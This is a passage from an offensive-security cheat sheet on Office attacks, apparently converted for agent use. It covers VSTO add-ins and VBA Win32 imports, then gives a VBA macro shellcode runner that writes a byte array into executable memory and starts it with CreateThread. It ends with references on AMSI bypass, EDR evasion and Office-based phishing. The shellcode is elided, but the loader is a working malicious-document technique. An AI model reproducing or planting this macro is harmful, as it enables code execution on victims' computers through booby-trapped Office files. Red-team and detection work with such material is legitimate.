<!-- provenance: InternalAllTheThings docs/redteam/access/office-attacks.md @ 203bb0c | part 3/3: Office Attacks - VSTO and Macro Development | converted for Agent Skills; see ../../NOTICE.md -->

# Office Attacks - VSTO and Macro Development

## Visual Studio Tools for Office (VSTO)

A VSTO file is a project file created with Visual Studio Tools for Office, a set of development tools provided by Microsoft for building custom add-ins and solutions for Microsoft Office applications. These projects allow developers to enhance the functionality of Office programs like Excel, Word, and Outlook by integrating additional features, automation, and user interface customizations.

* Visual Studio > `Word 2013 and 2016 VSTO Add-in`

## Office Macro Development

### Execute WinAPI

To importe Win32 function we need to use the keyword `Private Declare`

```vb
Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>
```

If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
Importing the `GetUserNameA` from `advapi32.dll`:

```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

`GetUserNameA` prototype in C:

```C
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```

### Example with a simple Shellcode Runner

```vb
Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Sub WinAPI()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    buf = Array(252, ...)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
```

## References

* [AMSI in the heap - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)
* [Analyzing VSTO Office Files - Didier Stevens - April 29, 2022](https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/)
* [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
* [Bypassing AMSI fro VBA - Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)
* [Dechaining macros and evading EDR - Noora Hyvärinen - 04/04/19](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
* [Evil Clippy MS Office Maldoc Assistant - Outflank](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)
* [Excel 4 Macro Generator x86/x64 - bytecod3r](https://bytecod3r.io/excel-4-macro-generator-x86-x64/)
* [Excel 4.0 Macro Function Reference PDF](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)
* [Excel 4.0 macro old but new - fsx30](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
* [Excel 4.0 Macros so hot right now - SneekyMonkey](https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/)
* [Executing macros from docx with remote - RedXORBlue - July 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
* [Further evasion in the forgotten corners of ms xls - malware.pizza](https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/)
* [Inject macro from a remote dotm template - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)
* [Macros and more with sharpshooter v2.0 - mdsec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
* [Make phishing great again. VSTO office files are the new macro nightmare? - Daniel Schell - Apr 14, 2022](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)
* [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)
* [Office VBA AMSI Parting the veil on malicious macros - Microsoft](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)
* [Old schoold evil execl 4.0 macros XLM - Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
* [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
* [Phishing SLK - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel)bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)
* [Phishinh with OLE - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk)
* [PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)
* [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
* [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
* [T1137.006 - Office Application Startup: Add-ins - redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md)
* [VBA RunPE Part 1 - itm4n](https://itm4n.github.io/vba-runpe-part1/)
* [VBA RunPE Part 2 - itm4n](https://itm4n.github.io/vba-runpe-part2/)
* [VBad - Pepitoh](https://github.com/Pepitoh/VBad)
* [VenomousSway - VBA payload generation framework / Retired TrustedSec Capabilities - Trustedsec - May 22, 2024](https://github.com/trustedsec/The_Shelf/tree/main/Retired/venomoussway)
* [VSTO: THE PAYLOAD INSTALLER THAT PROBABLY DEFEATS YOUR APPLICATION WHITELISTING RULES - BOHOPS - JANUARY 31, 2018](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
* [Windows Defender Exploit Guard ASR Rules for Office - Carlos Perez - November 14, 2017](https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office)
* [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)
* [XLS 4.0 macros and covenant - d-sec](https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/)
